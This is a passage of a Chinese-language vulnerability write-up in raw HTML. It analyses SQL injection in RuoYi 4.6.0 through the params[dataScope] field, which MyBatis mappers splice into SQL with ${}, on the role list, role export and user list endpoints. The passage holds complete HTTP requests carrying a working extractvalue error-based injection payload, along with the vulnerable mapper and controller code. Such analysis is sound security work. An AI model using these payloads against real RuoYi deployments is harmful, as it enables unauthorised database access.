</span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=eaeb8b8f-7702-4f7e-ab5f-767d916498d1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">pageSize</span>=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;roleName=&amp;roleKey=&amp;status=&amp;params%<span class="hljs-number">5</span>BbeginTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BendTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624198706-618da339-1494-45a8-8071-53e020705b28.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote><p>这里我们采用漏洞挖掘的思想进行漏洞分析</p></blockquote><p>在 MyBatis 配置中一般使用<code>#&#123;&#125;</code>实现类似预编译PreparedStatement 的占位效果，传入内容会进行相应的转义，可以用来防止 SQL 注入。</p><p>当 MyBatis 配置中采用<code>$&#123;&#125;</code>方式则是通过拼接字符串的形式构成 SQL 语句进行执行，容易产生 SQL 注入；</p><p>对于漏洞挖掘，首先需要找到的是容易产生 SQL 注入的点，也就是使用<code>$&#123;&#125;</code>进行拼接的 sql 语句，引入直接定位指定的文件掩码<code>*.xml</code>，并且使用关键字符进行搜索，如<code>$&#123;</code>或者正则搜索；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754625009006-6e108f90-c03d-4681-b3c7-41743bc4cbf6.png"></p><p>定位到一个容易产生 SQL 注入的 MyBatis 配置，位于<code>RuoYi-4.6.0\ruoyi-system\src\main\resources\mapper\system\SysRoleMapper.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectRoleList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysRole&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysRoleResult&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectRoleContactVo&quot;</span>/&gt;</span><br>  where r.del_flag = &#x27;0&#x27;<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleName != null and roleName != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.role_name like concat(&#x27;%&#x27;, #&#123;roleName&#125;, &#x27;%&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.status = #&#123;status&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleKey != null and roleKey != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.role_key like concat(&#x27;%&#x27;, #&#123;roleKey&#125;, &#x27;%&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;dataScope != null and dataScope != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.data_scope = #&#123;dataScope&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>    and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>    and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>  $&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该配置的 SQL 语句可以还原为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> r.role_id,<br>       r.role_name,<br>       r.role_key,<br>       r.status,<br>       r.data_scope,<br>       r.create_time<br><span class="hljs-keyword">FROM</span> sys_role r<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> sys_user_role ur <span class="hljs-keyword">ON</span> r.role_id <span class="hljs-operator">=</span> ur.role_id<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> sys_user u <span class="hljs-keyword">ON</span> ur.user_id <span class="hljs-operator">=</span> u.user_id<br><span class="hljs-keyword">WHERE</span> r.del_flag <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;0&#x27;</span><br>  <span class="hljs-keyword">AND</span> r.role_name <span class="hljs-keyword">LIKE</span> CONCAT(<span class="hljs-string">&#x27;%&#x27;</span>, ?, <span class="hljs-string">&#x27;%&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> r.status <span class="hljs-operator">=</span> ?<br>  <span class="hljs-keyword">AND</span> r.role_key <span class="hljs-keyword">LIKE</span> CONCAT(<span class="hljs-string">&#x27;%&#x27;</span>, ?, <span class="hljs-string">&#x27;%&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> r.data_scope <span class="hljs-operator">=</span> ?<br>  <span class="hljs-keyword">AND</span> DATE_FORMAT(r.create_time,<span class="hljs-string">&#x27;%y%m%d&#x27;</span>) <span class="hljs-operator">&gt;=</span> DATE_FORMAT(?, <span class="hljs-string">&#x27;%y%m%d&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> DATE_FORMAT(r.create_time,<span class="hljs-string">&#x27;%y%m%d&#x27;</span>) <span class="hljs-operator">&lt;=</span> DATE_FORMAT(?, <span class="hljs-string">&#x27;%y%m%d&#x27;</span>)<br>  $&#123;params.dataScope&#125;<br></code></pre></td></tr></table></figure><p>因此非常容易能够看出，只要<code>params.dataScope</code>可控，就能够构造一个非常有效的 SQL 注入；</p><p>定位该使用该 XML 配置进行处理的接口，通过<code>MyBatisX</code>插件定位函数，然后再一路查找函数用法，可以找到下方的接口处理函数，位于<code>RuoYi-4.6.0\ruoyi-admin\src\main\java\com\ruoyi\web\controller\system\SysRoleController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">list</span><span class="hljs-params">(SysRole role)</span><br>&#123;<br>    startPage();<br>    List&lt;SysRole&gt; list = roleService.selectRoleList(role);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure><p>传入参数为<code>SysRole</code>类型且没有对其进行任何过滤，<code>SysRole</code>继承<code>BaseEntity</code>类，在<code>BaseEntity</code>类中存在对<code>params</code>参数的定义，位于<code>RuoYi-4.6.0/ruoyi-common/src/main/java/com/ruoyi/common/core/domain/BaseEntity.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseEntity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-comment">/** 搜索值 */</span><br>    <span class="hljs-keyword">private</span> String searchValue;<br><br>    <span class="hljs-comment">/** 创建者 */</span><br>    <span class="hljs-keyword">private</span> String createBy;<br><br>    <span class="hljs-comment">/** 创建时间 */</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-keyword">private</span> Date createTime;<br><br>    <span class="hljs-comment">/** 更新者 */</span><br>    <span class="hljs-keyword">private</span> String updateBy;<br><br>    <span class="hljs-comment">/** 更新时间 */</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-keyword">private</span> Date updateTime;<br><br>    <span class="hljs-comment">/** 备注 */</span><br>    <span class="hljs-keyword">private</span> String remark;<br><br>    <span class="hljs-comment">/** 请求参数 */</span><br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; params;<br>    <br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>因此，可以直接通过传入<code>params[dataScope]=</code>参数对其中内容进行定义，该内容也会直接拼接在 sql 语句后，从而导致 sql 注入的产生。</p><h2 id="2-2-注入点-role-export接口（"><a href="#2-2-注入点-role-export接口（" class="headerlink" title="2.2 注入点/role/export接口（&lt;V4.6.2）"></a>2.2 注入点<code>/role/export</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633892665-c46c20fe-8d9f-4b2d-ba1c-39fe09c99590.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633906695-fa7d2726-c4e6-4a0a-9a76-90282920080d.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>179<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">roleName</span>=&amp;roleKey=&amp;status=&amp;params%<span class="hljs-number">5</span>BbeginTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BendTime%<span class="hljs-number">5</span>D=&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633853906-d64c4b46-cdb5-4556-bae3-615d0b0b1a1c.png"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析<a href="#P1ZYU">注入点&#x2F;role&#x2F;list接口</a>一致，因此这里不在赘述，简单进行分析。</p><p>根据 Mybatis 的配置可以看出在此处是存在 sql 注入的可能性；</p><p><code>RuoYi-4.6.0/ruoyi-system/src/main/resources/mapper/system/SysRoleMapper.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectRoleList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysRole&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysRoleResult&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectRoleContactVo&quot;</span>/&gt;</span><br>where r.del_flag = &#x27;0&#x27;<br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleName != null and roleName != &#x27;&#x27;&quot;</span>&gt;</span><br>AND r.role_name like concat(&#x27;%&#x27;, #&#123;roleName&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>AND r.status = #&#123;status&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleKey != null and roleKey != &#x27;&#x27;&quot;</span>&gt;</span><br>AND r.role_key like concat(&#x27;%&#x27;, #&#123;roleKey&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;dataScope != null and dataScope != &#x27;&#x27;&quot;</span>&gt;</span><br>AND r.data_scope = #&#123;dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>找到使用相应 Mybatis 配置的位置可以看出与<code>/role/list</code>接口一致，传入的是<code>SysRole</code>参数，从而能够通过定义<code>params.dataScope</code>实现 sql 注入；</p><p><code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysRoleController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Log(title = &quot;角色管理&quot;, businessType = BusinessType.EXPORT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:export&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/export&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">export</span><span class="hljs-params">(SysRole role)</span><br>&#123;<br>    List&lt;SysRole&gt; list = roleService.selectRoleList(role);<br>    ExcelUtil&lt;SysRole&gt; util = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExcelUtil</span>&lt;SysRole&gt;(SysRole.class);<br>    <span class="hljs-keyword">return</span> util.exportExcel(list, <span class="hljs-string">&quot;角色数据&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-注入点-user-list接口（"><a href="#2-3-注入点-user-list接口（" class="headerlink" title="2.3 注入点/user/list接口（&lt;V4.6.2）"></a>2.3 注入点<code>/user/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634541017-1b2aaeaf-2e9f-4012-9efe-d2f08c4bc8ef.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634514079-d2f7361a-f255-4e52-bdc0-41072be7b8c5.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>227<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/user<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;deptId</span>=<span class="hljs-variable">&amp;parentId</span>=<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>%5BbeginTime%5D=<span class="hljs-variable">&amp;params</span>%5BendTime%5D=<span class="hljs-variable">&amp;params</span>%5BdataScope%5D=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> user()),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634473171-c67bc5d6-9f19-4d42-87ff-9ce4c3fbed5b.png"></p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectUserList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>select u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.password, u.sex, u.salt, u.status, u.del_flag, u.login_ip, u.login_date, u.create_by, u.create_time, u.remark, d.dept_name, d.leader from sys_user u<br>left join sys_dept d on u.dept_id = d.dept_id<br>where u.del_flag = &#x27;0&#x27;<br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.status = #&#123;status&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>AND date_format(u.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>AND date_format(u.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;deptId != null and deptId != 0&quot;</span>&gt;</span><br>AND (u.dept_id = #&#123;deptId&#125; OR u.dept_id IN ( SELECT t.dept_id FROM sys_dept t WHERE FIND_IN_SET (#&#123;deptId&#125;,ancestors) ))<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 